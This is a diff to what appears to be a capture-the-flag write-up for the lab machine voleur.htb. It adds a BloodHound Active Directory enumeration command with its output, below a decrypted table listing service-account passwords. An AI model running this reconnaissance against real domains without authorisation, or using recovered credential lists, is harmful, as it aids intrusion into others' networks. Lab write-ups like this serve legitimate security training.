@@ -245,6 +245,33 @@ decrypted file:
 | svc_ldap         |                                | LDAP Services            | P/W - M1XyC9pW7qT5Vn                                                  |
 | svc_iis          |                                | IIS Administration       | P/W - N5pXyW1VqM7CZ8                                                  |
 | svc_winrm        |                                | Remote Management        | Need to ask Lacey as she reset this recently.                         |
+## Bloodhound enumeration
+
+```
+sudo ntpdate DC.voleur.htb && sudo -E bloodhound-python -k -u ryan.naylor -ns 10.129.232.130 -d voleur.htb -c all --zip -no-pass
+2026-10-06 00:55:00.494694 (-0400) +0.000956 +/- 0.014267 DC.voleur.htb 10.129.232.130 s1 no-leap
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: voleur.htb
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: dc.voleur.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.voleur.htb
+INFO: Found 12 users
+INFO: Found 56 groups
+INFO: Found 2 gpos
+INFO: Found 5 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.voleur.htb
+WARNING: Failed to get service ticket for DC.voleur.htb, skipping host
+INFO: Done in -481M 11S
+INFO: Compressing output into 20261006005501_bloodhound.zip
+
+```
 ## Foothold
 
 How you gained initial access to the machine.
